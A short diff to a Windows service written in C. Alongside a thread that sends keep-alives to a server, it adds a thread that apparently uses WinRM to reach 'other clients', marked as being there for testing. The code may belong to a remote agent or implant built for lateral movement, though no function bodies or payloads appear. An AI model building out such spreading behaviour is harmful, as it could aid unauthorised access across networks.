@@ -217,7 +217,10 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
     freeaddrinfo(res);
 
     // Start a thread to send a keep alive message every 30 seconds to the Server
-    HANDLE thread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);
+    HANDLE keepAliveThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);
+
+    // Start a thread to winrm to other clients, this is only here right now for testing
+    HANDLE winrmThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&winrmOtherClients, NULL, 0, NULL);
 
     // Main service loop
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
